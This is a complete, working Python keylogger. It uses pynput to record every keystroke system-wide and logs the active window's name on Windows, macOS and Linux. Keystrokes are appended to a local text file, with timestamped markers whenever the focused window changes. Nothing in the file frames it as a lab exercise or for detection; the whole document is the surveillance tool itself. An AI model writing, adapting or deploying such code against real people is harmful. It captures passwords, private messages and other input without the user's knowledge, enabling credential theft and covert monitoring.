from pynput import keyboard
import datetime
import platform

# For Windows
if platform.system() == "Windows":
    import win32gui
    import win32process
    import psutil


    def get_active_window():
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}"
        except:
            return "Unknown"

# For macOS
elif platform.system() == "Darwin":
    from AppKit import NSWorkspace


    def get_active_window():
        active_app = NSWorkspace.sharedWorkspace().activeApplication()
        return f"{active_app['NSApplicationName']}"

# For Linux
elif platform.system() == "Linux":
    import subprocess


    def get_active_window():
        try:
            window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
            window_name = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
            return window_name
        except:
            return "Unknown"

log_file = "detailed_keylog.txt"
current_window = ""


def on_press(key):
    global current_window

    # Get current active window
    active_window = get_active_window()

    # Log window change
    if active_window != current_window:
        current_window = active_window
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'=' * 60}\n[{timestamp}] WINDOW CHANGED: {current_window}\n{'=' * 60}\n")

    # Log keystroke
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f" [{key}] ")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()